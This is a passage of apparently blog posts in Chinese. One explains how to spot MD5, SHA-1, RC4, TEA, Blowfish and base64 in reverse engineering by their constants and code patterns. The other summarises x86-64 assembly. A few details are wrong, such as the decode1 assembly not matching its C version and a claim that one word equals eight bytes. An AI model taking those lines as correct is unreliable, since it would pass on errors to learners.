class="keyword">for</span> each <span class="number">512</span>-bit chunk <span class="keyword">of</span> message</span><br><span class="line">    <span class="keyword">break</span> chunk into sixteen <span class="number">32</span>-bit little-endian words w[i], <span class="number">0</span> ≤ i ≤ <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Initialize hash value for this chunk:</span></span><br><span class="line">    <span class="keyword">var</span> int a := h0</span><br><span class="line">    <span class="keyword">var</span> int b := h1</span><br><span class="line">    <span class="keyword">var</span> int c := h2</span><br><span class="line">    <span class="keyword">var</span> int d := h3</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Main loop:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> ≤ i ≤ <span class="number">15</span> then</span><br><span class="line">            f := (b and c) or ((not b) and d)</span><br><span class="line">            g := i</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">16</span> ≤ i ≤ <span class="number">31</span></span><br><span class="line">            f := (d and b) or ((not d) and c)</span><br><span class="line">            g := (<span class="number">5</span>×i + <span class="number">1</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">32</span> ≤ i ≤ <span class="number">47</span></span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            g := (<span class="number">3</span>×i + <span class="number">5</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">48</span> ≤ i ≤ <span class="number">63</span></span><br><span class="line">            f := c xor (b or (not d))</span><br><span class="line">            g := (<span class="number">7</span>×i) mod <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        temp := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := <span class="title function_">leftrotate</span>((a + f + k[i] + w[g]),r[i]) + b</span><br><span class="line">        a := temp</span><br><span class="line">    <span class="title class_">Next</span> i</span><br><span class="line">    <span class="comment">//Add this chunk&#x27;s hash to result so far:</span></span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b </span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line"><span class="title class_">End</span> <span class="title class_">ForEach</span></span><br><span class="line"><span class="keyword">var</span> int digest := h0 append h1 append h2 append h3 <span class="comment">//(expressed as little-endian)</span></span><br></pre></td></tr></table></figure>



<p>MD5的源码满天飞，最好识别的一个特色就是，MD5算法需要初始化4个32位的常数，用16进制表示</p>
<blockquote>
<p>h0 &#x3D; 0x67452301;   </p>
<p>h1 &#x3D; 0xefcdab89;  </p>
<p>h2 &#x3D; 0x98badcfe;    </p>
<p>h3 &#x3D; 0x10325476;</p>
</blockquote>
<p>如果看到有4个类似的16进制数，可以重点怀疑</p>
<p>第二个特点就是MD5算法会用到abs(sin(i))函数的值，这个函数的值可以查表去了解一些常见的，如果在逆向分析程序时又看到这个函数的值，那么也可以帮助你判断这是MD5</p>
<h3 id="2-SHA-1-用PEID可看到SHA-1"><a href="#2-SHA-1-用PEID可看到SHA-1" class="headerlink" title="2.SHA-1(用PEID可看到SHA-1)"></a>2.SHA-1(用PEID可看到SHA-1)</h3><p>SHA-1和MD5类似，特色就是要初始化一些常数，SHA-1要初始化5个32位16进制数</p>
<blockquote>
<p>h0:&#x3D; 0x67452301  </p>
<p>h1:&#x3D; 0xEFCDAB89  </p>
<p>h2:&#x3D; 0x98BADCFE  </p>
<p>h3:&#x3D; 0x10325476  </p>
<p>h4:&#x3D; 0xC3D2E1F0</p>
</blockquote>
<p>同理SHA-256、SHA-384、SHA-512也有对应的初始化数据，这里就不一一列举了</p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h3 id="1-RC4"><a href="#1-RC4" class="headerlink" title="1.RC4"></a>1.RC4</h3><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自 Rivest Cipher 4 的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86">流加密</a>算法，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//初始化函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *Data, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//加解密</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>通过分析初始化代码，可以看出初始化代码中，对字符数组 s 进行了初始化赋值，且赋值分别递增。之后对 s 进行了 256 次交换操作。通过识别初始化代码，可以知道 rc4 算法。</p>
<p>其伪代码表示为：</p>
<p>初始化长度为 256 的 <a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S 盒</a>。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒。第二个 for 循环根据密钥打乱 S 盒。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">255</span></span><br><span class="line">    S[i] := i</span><br><span class="line"><span class="keyword">endfor</span></span><br><span class="line">j := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span> ; i&lt;<span class="number">256</span> ; i++)</span><br><span class="line">    j := (j + S[i] + key[i mod keylength]) % <span class="number">256</span></span><br><span class="line">    swap values of S[i] <span class="keyword">and</span> S[j]</span><br><span class="line"><span class="keyword">endfor</span></span><br></pre></td></tr></table></figure>

<p>下面 i,j 是两个指针。每收到一个字节，就进行 while 循环。通过一定的算法（(a),(b)）定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒（©）。如果输入的是<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>，输出的就是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>；如果输入的是密文，输出的就是明文。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">i := <span class="number">0</span></span><br><span class="line">j := <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> GeneratingOutput:</span><br><span class="line">    i := (i + <span class="number">1</span>) mod <span class="number">256</span>   <span class="comment">//a</span></span><br><span class="line">    j := (j + S[i]) mod <span class="number">256</span> <span class="comment">//b</span></span><br><span class="line">    swap values of S[i] <span class="keyword">and</span> S[j]  <span class="comment">//c</span></span><br><span class="line">    k := inputByte ^ S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">    output K</span><br><span class="line"><span class="keyword">endwhile</span></span><br></pre></td></tr></table></figure>

<p>此算法保证每 256 次循环中 S 盒的每个元素至少被交换过一次</p>
<p>RC4其实很难说有特色，但他本身的加密算法很简单，分析起来还比较方便</p>
<p>硬要说特色的话，首先要有加密数组和加密数组，数组必须要有，然后就没有多余操作，进行加解密就好了</p>
<p>关键数字是256（0x100），因为里面存在许多交换操作，都是256次！</p>
<h3 id="2-TEA"><a href="#2-TEA" class="headerlink" title="2.TEA"></a>2.TEA</h3><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a>中，<strong>微型加密算法</strong>（Tiny Encryption Algorithm，TEA）是一种易于描述和<a href="https://zh.wikipedia.org/w/index.php?title=%E6%89%A7%E8%A1%8C&action=edit&redlink=1">执行</a>的<a href="https://zh.wikipedia.org/wiki/%E5%A1%8A%E5%AF%86%E7%A2%BC">块密码</a>，通常只需要很少的代码就可实现。</p>
<figure class="highlight v"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdint<span class="variable">.h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0</span>x9e3779b9;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>xC6EF3720, i;  <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0</span>x9e3779b9;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Tea 算法中其最主要的识别特征就是 拥有一个 magic number ：0x9e3779b9 。当然，这 Tea 算法也有魔改的</p>
<p>这个算法最大的特点在于，他用到了黄金分割线作为密钥调度常数（9e3779b9h）</p>
<p>有些时候可能这个常熟不是很明显，换成了加加减减的操作，这个需要自己是别的，也不会很复杂</p>
<p>同时也会进行分组操作来方便计算，如果你发现有两块进行了分组，并且其中一块的内存分配是另一块的两倍也可以帮助验证，因为TEA算法中，分组长度为64位，密钥长度为128位</p>
<p>最后一个辅助判断就是常数32了，如果程序中定的循环次数是32次（加密解密循环次数），再结合之前的，八九不离十了</p>
<h3 id="3-BlowFish-用PEID可看到P数组和S-BOX"><a href="#3-BlowFish-用PEID可看到P数组和S-BOX" class="headerlink" title="3.BlowFish(用PEID可看到P数组和S-BOX)"></a>3.BlowFish(用PEID可看到P数组和S-BOX)</h3><p><strong>BlowFish</strong> 每次加密数据为 <strong>64位</strong> （2个int)类型数据大小。八个字节, 密钥采用32-448位</p>
<p>BlowFish是由一个16轮循环的Feistel结构进行加密的。</p>
<p><strong>BlowFish</strong> 算法流程是由两部分组成 分别是<strong>密钥扩展</strong>以及<a href="https://cloud.tencent.com/solution/domesticencryption?from=20065&from_column=20065"><strong>数据加密</strong></a>，在数据加密中是一个16轮循环的Feistel网络。每一轮由一个密钥相关置换和一个密钥与数据相关的替换组成的。</p>
<p>先说一下BlowFish需要的子密钥。</p>
<p>BlowFish在加密或者初始化的过程中会使用两个盒来进行加密</p>
<p>分别是<strong>PBOX</strong> 以及<strong>SBOX</strong></p>
<p>PBOX是 由18个32位的字的子密钥组成的。这些密钥可以通过预计算产生的。</p>
<p>其p[0] &#x3D; 0x243F6A88 P[1] &#x3D; 0X85A308D3 P[2] &#x3D; 0X13198A2E P[3] &#x3D; 0X03707344中PBOX记录的就是<strong>Π</strong>后面的小数位。转换成16进制存储到pBox中</p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">p[<span class="number">0</span>] = <span class="number">0x243F6A88</span></span><br><span class="line">P[<span class="number">1</span>] = <span class="number">0X85A308D3</span></span><br><span class="line">P[<span class="number">2</span>] = <span class="number">0X13198A2E</span></span><br><span class="line">P[<span class="number">3</span>] = <span class="number">0X03707344</span></span><br></pre></td></tr></table></figure>

<p>Sbox跟PBOX一样也是Π的小数位组成。sBox是4组8*32的数组。 如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">s_box[<span class="number">4</span>][<span class="number">256</span>] = &#123;&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>pBox与Sbox就是BlowFish算法进行加密的核心置换表</p>
<p>子密钥生成,<strong>也就是要将我们的Key 与 pbox进行 异或</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N 16</span></span><br><span class="line"><span class="comment">//定义初始化需要用到的加密结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BLOWFISH_CTX</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//定义初始化的pbox 以及 sbox 在程序中进行初始化</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> pbox[N + <span class="number">2</span>];  <span class="comment">//总共18</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sbox[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125;BLOWFISH_CTX,*PBLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">BlowFishInit</span><span class="params">(BLOWFISH_CTX* blowCtx, <span class="type">unsigned</span> <span class="type">char</span> * key, <span class="type">unsigned</span> <span class="type">int</span> keylen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//第一步初始化Sbox的值 sbox是预先生成的。在全局区是 ORIG_S 数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> Row = <span class="number">0</span>; Row &lt; <span class="number">4</span>; Row++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> Col = <span class="number">0</span>; Col &lt; <span class="number">256</span>; Col++)</span><br><span class="line">        &#123;</span><br><span class="line">            blowCtx-&gt;sbox[Row][Col] = ORIG_S[Row][Col];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第二步 子密钥生成设置key_Pbox</span></span><br><span class="line"><span class="comment">    设置pbox</span></span><br><span class="line"><span class="comment">    1.循环18轮</span></span><br><span class="line"><span class="comment">    2.每轮都设置ctx.pbox值与data ^</span></span><br><span class="line"><span class="comment">    3.data = *(DWORD*)key[0] key[1]..... </span></span><br><span class="line"><span class="comment">    data其实就是4字节转换的Ascii值</span></span><br><span class="line"><span class="comment">    设key = &quot;IBinary&quot;</span></span><br><span class="line"><span class="comment">    data = &quot;IBin&quot;  类似于 memcpy(&amp;data,&quot;IBin&quot;,4);</span></span><br><span class="line"><span class="comment">    当key不足的时候重新从头开始获取并且补足</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> KeyIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; N + <span class="number">2</span>; index++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> data = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//填充data 将key的字符设置到data当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//通过移位设置每个字符</span></span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[KeyIndex];</span><br><span class="line">            KeyIndex++;</span><br><span class="line">            <span class="comment">//如果超出了key长度 那么key要从开始</span></span><br><span class="line">            <span class="keyword">if</span> (KeyIndex &gt;= keylen)</span><br><span class="line">                KeyIndex = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这是时设置key_pbox的值。 原理就是 pbox ^ data  data就是我们的第二层循环。 就是获取四字节的key值 如果你的key只有四个字节。那么</span></span><br><span class="line">        <span class="comment">//都可以不使用第二层循环了</span></span><br><span class="line">        blowCtx-&gt;pbox[index] = ORIG_P[index] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第三步 设置key_pbox 与 key_sbox的值</span></span><br><span class="line"><span class="comment">   	1.对一个64位0 进行加密。加密结果的输出设置到pbox[i]与pbox[i+1]中</span></span><br><span class="line"><span class="comment">   	2.初始化key_pbox之后继续重用Data1与Data2 继续进行加密设置到s_box中</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Data1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Data2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">        blowCtx-&gt;pbox[i] = Data1;</span><br><span class="line">        blowCtx-&gt;pbox[i+<span class="number">1</span>] = Data2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化Sbox</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">            blowCtx-&gt;sbox[i][j] = Data1;</span><br><span class="line">            blowCtx-&gt;sbox[i][j + <span class="number">1</span>] = Data2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(未完待续。。。)</p>
<h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><p>IDEA(International Data Encryption Algorithm）<strong>在密码学中属于数据块加密算法（Block Cipher）类</strong>。 IDEA使用长度为128bit的密钥，数据块大小为64bit。 从理论上讲，IDEA属于“强”加密算法，至今还没有出现对该算法的有效攻击算法。</p>
<p>(未完待续)</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>base64</p>
<p>Base64 是一种基于 64 个可打印字符来表示二进制数据的表示方法。转换的时候，将 3 字节的数据，先后放入一个 24 位的缓冲区中，先来的字节占高位。数据不足 3 字节的话，于缓冲器中剩下的比特用 0 补足。每次取出 6 比特（因为 <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/c4becc8d811901597b9807eccff60f0897e3701a" alt="{\displaystyle 2^{6}=64}">），按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出，直到全部输入数据转换完成。</p>
<p>通常而言 Base64 的识别特征为索引表，当我们能找到 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 这样索引表，再经过简单的分析基本就能判定是 Base64 编码。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>加密编码</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言简单摘要</title>
    <url>/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/</url>
    <content><![CDATA[<h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>

<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov 数据传送指令 将数据从一个位置复制到另一个位置的指令<br>mov 寄存器&#x2F;立即数 操作数用来指向一个执行所要使用源数据的值，放置结果的目的位置，mov 源操作数的值是一个立即数，值存放在内存或者寄存器中 目的操作数一个寄存器或者是一个内存地址。</p>
<p><strong>单位</strong>：1字节 &#x3D; 8bit  1字 &#x3D; 8字节 &#x3D; 64bit</p>
<p><strong>movb 一个字节</strong> (这个字代表双字节的意思，与上边的字不一样)<br><strong>movw 一个字<br>movl 双字（寄存器的高四字节设置成0）<br>movq 四字<br>movabsq I,R  R&lt;-I 传送的是绝对的四字 目的操作数只能是寄存器</strong><br>movl $0x4050,%eax      4bytes   立即数–寄存器<br>movw %bp,%sp           2bytes   寄存器–寄存器<br>movb (%rdi,%rcx),%al   1bytes  内存–寄存器<br>movb $-17,(%rsp)       1bytes   立即数–内存<br>movq %rax,-12(%rbp)    8bytes   寄存器–内存l</p>
<h5 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">movabsq <span class="variable">$0x0011223344556677</span> , %rax = 0011223344556677  </span><br><span class="line">（ rax包含了eax eax包含了ax ax包含了al）</span><br><span class="line">-1的16进制是0xFFFFFFFFFFFFFF,第一步结束后每一步rax的值是多少</span><br><span class="line">movb $-1 ,%al           ， %rax = 00112233445566FF   F = 1111</span><br><span class="line">movw $-1 , %ax          ， %rax = 001122334455FFFF   </span><br><span class="line">movl $-1 , %eax         ， %rax = 00000000FFFFFFFF</span><br><span class="line">movq $-1 ,%rax          ， %rax = FFFFFFFFFFFFFFFF </span><br></pre></td></tr></table></figure>


<h5 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h5><p>把下列汇编代码用c语言表示  （rax一直保存的是返回值）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode1:</span><br><span class="line">    movq (%rdi) , %r8</span><br><span class="line">    movq (%rsi) , %rcx</span><br><span class="line">    movq (%rdx) , %rax</span><br><span class="line">    movq %r8    , (%rsi)</span><br><span class="line">    movq %rcx   , (%rdx)</span><br><span class="line">    movq %rax ,   (%rdx)      </span><br><span class="line">    ret </span><br></pre></td></tr></table></figure>
<p>c语言</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode1</span><span class="params">(<span class="type">long</span> *xp,<span class="type">long</span> *yp,<span class="type">long</span> *zp)</span>&#123;</span><br><span class="line">     <span class="type">long</span> x = *xp;</span><br><span class="line">     <span class="type">long</span> y = *yp;</span><br><span class="line">     <span class="type">long</span> z = *zp;</span><br><span class="line">     *yp = x;</span><br><span class="line">     *zp = y;</span><br><span class="line">     *xp = z;</span><br><span class="line">     <span class="keyword">return</span> z;</span><br><span class="line"> &#125;    </span><br><span class="line">     </span><br></pre></td></tr></table></figure>
<h4 id="push和pop"><a href="#push和pop" class="headerlink" title="push和pop"></a>push和pop</h4><p>push压入栈 pop弹出栈（pop弹出的值一直是一个最近压入栈的数据且仍在栈中）<br>由于栈是由大到小增长的，所以栈顶永远是地址最低的 %rsp保存着栈顶的元素<br>pushq popq 将四字压入栈中 将四字弹出栈<br>pushq %rbp &#x3D; subq $8,%rsp  movq %rbp,(%rsp)   （rsp地址减8）<br>popq <strong>%rax</strong>  &lt;&#x3D;&#x3D;&gt; movq (%rsp),(<strong>%rax</strong>) addq $8,%rsp （rsp地址加8）<br><strong>pop之后，值不会被删除，除非有一个新的值覆盖了原先的值</strong></p>
<h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">leaq  --&gt; 加载有效地址 </span><br><span class="line">inc --&gt; 加一 </span><br><span class="line">dec --&gt; 减一 </span><br><span class="line">neg --&gt; 取负 </span><br><span class="line">not --&gt; 取补 </span><br><span class="line">add --&gt; 加 </span><br><span class="line">sub --&gt; 减 </span><br><span class="line">imul --&gt; 乘 </span><br><span class="line">xor --&gt; 异或 </span><br><span class="line">or --&gt; 或 </span><br><span class="line">and --&gt; 与 </span><br><span class="line">sal --&gt; 算数左移 </span><br><span class="line"> sar --&gt; 算数右移 </span><br><span class="line"> shl --&gt;逻辑左移</span><br><span class="line">shr --&gt; 逻辑右移</span><br></pre></td></tr></table></figure>
<h5 id="1-加载地址"><a href="#1-加载地址" class="headerlink" title="1.加载地址"></a>1.加载地址</h5><p>movq的一种变形 从内存读数据到寄存器 但是没有引用内存 不是单纯的读数据，而是将有效地址加载到目的操作数 <strong>描述简单的算数操作</strong></p>
<h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p>rdi &#x3D; x<br> leaq 7(%rdi,%rdi,4),%rax &#x3D;&#x3D; 将rax的值设置为5x+7</p>
